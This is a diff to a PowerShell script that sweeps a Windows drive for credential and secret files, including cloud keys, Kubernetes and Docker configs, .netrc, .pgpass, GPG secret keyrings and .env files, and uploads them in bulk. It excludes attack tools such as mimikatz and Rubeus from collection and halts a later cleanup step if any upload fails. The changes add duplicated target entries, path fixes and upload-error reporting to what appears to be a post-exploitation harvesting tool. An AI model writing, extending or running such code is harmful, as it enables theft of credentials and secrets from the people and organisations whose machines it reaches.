@@ -272,7 +272,11 @@ $interestingFiles = @(
     "web.config", "appsettings.json", ".env", ".env.local", ".env.production",
     ".aws\credentials", ".aws\config", ".docker\config.json", ".kube\config",
     ".npmrc", ".pip\pip.conf", ".netrc", ".my.cnf", ".pgpass", ".ldaprc",
-    ".subversion\config", ".gnupg\secring.gpg", ".gnupg\pubring.gpg", ".gnupg\trustdb.gpg"
+    ".subversion\config", ".gnupg\secring.gpg", ".gnupg\pubring.gpg",
+    ".gnupg\trustdb.gpg", ".ssh\known_hosts", ".ssh\config", ".aws\credentials",
+    ".aws\config", ".docker\config.json", ".kube\config", ".npmrc", ".pip\pip.conf",
+    ".netrc", ".my.cnf", ".pgpass", ".ldaprc", ".subversion\config",
+    ".gnupg\secring.gpg", ".gnupg\pubring.gpg", ".gnupg\trustdb.gpg"
 )
 
 # Define source and destination
@@ -280,7 +284,7 @@ $sourceRoot = "C:\"
 
 # Comprehensive list of tools and scripts to exclude
 $excludePatterns = @(
-    "mimikatz*", "SharpHound*", "winPEAS*", "PowerView*", "PowerUp*", 
+    "mimikatz*", "SharpHound*", "winPEAS.exe*", "PowerView*", "PowerUp*", 
     "BloodHound*", "custom_upload*", "slamit*", "PsExec*", "Rubeus*", 
     "chisel*", "agent*", "*.ps1", "*.exe", "*.bat", "*.cmd"
 )
@@ -392,10 +396,10 @@ try
     foreach ($file in $files) {
         $uploadCount++
         try {
-            $fileBytes = [System.IO.File]::ReadAllBytes($file)
+            $fileBytes = [System.IO.File]::ReadAllBytes($file.FullName)
             $boundary = [System.Guid]::NewGuid().ToString()
             $lf = "`r`n"
-            $fileName = [System.IO.Path]::GetFileName($file)
+            $fileName = [System.IO.Path]::GetFileName($file.FullName)
 
             # Folder part
             $folderPart = "--$boundary$lf" +
@@ -429,6 +433,9 @@ try
         }
         catch {
             $failedCount++
+            $fileName = [System.IO.Path]::GetFileName($file)
+            Write-CenteredText "Upload failed for: $fileName" "Red"
+            Write-CenteredText "Error: $($_.Exception.Message)" "Red"
         }
     }
 
@@ -439,6 +446,12 @@ try
     Write-CenteredText "  Successfully Uploaded: $successCount" "Green"
     Write-CenteredText "  Failed Uploads: $failedCount" "Red"
     Write-Host ""
+    
+    # Check if any uploads failed and exit if so
+    if ($failedCount -gt 0) {
+        Write-CenteredText "Upload failures detected - cleanup will not continue" "Red"
+        exit 1
+    }
 }
 catch
 {
